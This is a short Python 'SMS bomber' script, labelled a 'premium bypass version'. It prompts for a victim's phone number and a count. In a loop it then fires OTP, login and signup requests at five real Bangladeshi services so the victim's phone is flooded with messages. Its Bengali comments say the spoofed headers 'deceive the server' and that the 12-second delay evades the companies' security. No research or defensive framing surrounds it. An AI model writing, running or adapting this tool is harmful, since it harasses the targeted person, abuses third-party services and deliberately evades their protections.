import requests, os, time

def start():
    os.system('clear')
    print('\033[1;32m   [ PREMIUM BYPASS VERSION ]\033[0m')
    target = input('\n\033[1;32m[+] TARGET: \033[0m')
    amount = int(input('\033[1;32m[+] AMOUNT: \033[0m'))
    
    # এই হেডারগুলো সার্ভারকে ধোঁকা দিতে সাহায্য করে
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Referer": "https://www.google.com/"
    }

    for i in range(1, amount + 1):
        try:
            # ৫টি আলাদা শক্তিশালী সোর্স
            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers)
            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers)
            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers)
            requests.post("https://redx.com.bd/api/v1/user/signup", json={"phone": target}, headers=headers)
            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers)
            
            print(f'\033[1;32m[{i}] VIP SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] FILTERED BY SERVER\033[0m')
        
        time.sleep(12) # কোম্পানিগুলোর সিকিউরিটি এড়াতে একটু বেশি সময় (১২ সেকেন্ড) গ্যাপ দিন

if __name__ == "__main__":
    start()
